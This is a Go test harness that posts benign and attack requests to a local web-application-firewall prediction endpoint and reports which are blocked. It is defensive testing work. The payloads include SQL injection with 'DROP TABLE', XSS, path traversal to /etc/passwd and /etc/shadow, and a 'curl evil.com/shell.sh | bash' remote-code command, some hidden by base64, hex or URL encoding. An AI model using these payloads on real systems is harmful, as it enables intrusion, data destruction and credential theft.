package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

type Payload map[string]string

type TestCase struct {
	Name    string
	Payload Payload
}

type PredictResponse struct {
	Status  string `json:"status"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

func main() {
	url := "http://127.0.0.1:10001/predict"

	testCases := []TestCase{
		{
			Name:    "Normal Search",
			Payload: Payload{"q": "how to learn deep learning"},
		},
		{
			Name:    "Normal Page",
			Payload: Payload{"page": "about_us.html", "id": "123"},
		},
		{
			Name:    "SQL Injection 1",
			Payload: Payload{"user": "admin' OR '1'='1", "pass": "password"},
		},
		{
			Name:    "SQL Injection 2",
			Payload: Payload{"id": "1; DROP TABLE users--"},
		},
		{
			Name:    "XSS Attack 1",
			Payload: Payload{"comment": "<script>alert('XSS')</script>"},
		},
		{
			Name:    "XSS Attack 2",
			Payload: Payload{"search": "\"><img src=x onerror=prompt(1)>"},
		},
		{
			Name:    "Path Traversal",
			Payload: Payload{"file": "../../../../etc/passwd"},
		},
		{
			Name:    "LFI",
			Payload: Payload{"include": "/var/www/html/../../../etc/shadow"},
		},
		{
			Name:    "RCE Attack 1",
			Payload: Payload{"cmd": "eval(base64_decode('somepayload'))"},
		},
		{
			Name:    "RCE Attack 2",
			Payload: Payload{"exec": "curl http://evil.com/shell.sh | bash"},
		},
		{
			Name:    "URL Encoded SQLi",
			Payload: Payload{"user": "admin%27%20OR%20%271%27%3D%271"},
		},
		{
			Name:    "URL Encoded XSS",
			Payload: Payload{"search": "%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E"},
		},
		{
			Name:    "Base64 Encoded RCE",
			Payload: Payload{"cmd": "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo"},
		},
		{
			Name:    "Hex Encoded SQLi",
			Payload: Payload{"id": "0x61646d696e27204f52202731273d2731"},
		},
		{
			Name:    "Double URL Encoded XSS",
			Payload: Payload{"q": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
		},
	}

	fmt.Println("Simulating attacker traffic against WAF Server from Go...\n")

	client := &http.Client{Timeout: 5 * time.Second}

	for _, tc := range testCases {
		fmt.Printf("[*] Testing: %s\n", tc.Name)
		fmt.Printf("    Payload: %v\n", tc.Payload)

		jsonData, err := json.Marshal(tc.Payload)
		if err != nil {
			fmt.Printf("    [-] Error marshaling JSON: %v\n", err)
			continue
		}

		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("    [-] Error creating request: %v\n", err)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("    [-] Error sending request: %v\n", err)
			fmt.Println(strings.Repeat("-", 50))
			continue
		}

		var result PredictResponse
		err = json.NewDecoder(resp.Body).Decode(&result)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("    [-] Error decoding response: %v\n", err)
			fmt.Println(strings.Repeat("-", 50))
			continue
		}

		if result.Status == "ATTACK" {
			fmt.Printf("    [!] BLOCKED. Detected as: %s\n", strings.ToUpper(result.Type))
		} else {
			fmt.Printf("    [+] ALLOWED. Status: %s (%s)\n", strings.ToUpper(result.Status), result.Type)
		}

		fmt.Println(strings.Repeat("-", 50))
		time.Sleep(500 * time.Millisecond)
	}
}
